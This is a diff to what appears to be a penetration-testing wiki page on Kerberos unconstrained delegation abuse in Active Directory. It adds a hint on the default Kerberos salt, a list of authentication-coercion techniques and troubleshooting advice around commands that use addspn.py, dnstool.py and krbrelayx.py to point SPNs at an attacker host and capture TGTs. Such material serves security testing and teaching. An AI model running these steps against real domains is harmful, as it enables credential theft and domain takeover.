@@ -43,6 +43,10 @@ When attacking accounts able to delegate without constraints, there are two majo
 * **the account is a user**: users can't edit their own SPNs like computers do. Attackers need to control an [account operator](../privileged-groups.md) \(or any other user that has the needed privileges\) to edit the user's SPNs. Moreover, since tickets received by krbrelayx will be encrypted with RC4, attackers will need to either supply the NT hash \(`-hashes` argument\) or the salt and password \(`--krbsalt` and `--krbpass` arguments\)
 {% endhint %}
 
+{% hint style="success" %}
+By default, the salt is always `DOMAINusername`.
+{% endhint %}
+
 ```bash
 # 1. Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)
 addspn.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -s 'HOST/attacker.DOMAIN_FQDN' --additional 'DomainController'
@@ -54,7 +58,12 @@ dnstool.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -r 'attacker.DOMAIN_
 krbrelayx.py --krbsalt 'DOMAINusername' --krbpass 'password'
 
 # 4. Authentication coercion
+# PrinterBug, PetitPotam, PrivExchange, ...
 ```
+
+{% hint style="warning" %}
+In case, for some reason, attacking a Domain Controller doesn't work \(i.e. error saying`Ciphertext integrity failed.`\) try to attack others \(if you're certain the credentials you supplied were correct\). Some replication and propagation issues could get in the way.
+{% endhint %}
 
 Once the krbrelayx listener is ready, an [authentication coercion attack](../mitm-and-coerced-authentications/) \(e.g. [PrinterBug](../mitm-and-coerced-authentications/#ms-rprn-abuse-a-k-a-printer-bug), [PrivExchange](../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange)\) can be operated. The listener will then receive a Kerberos authentication, hence a ST, containing a TGT.
 {% endtab %}
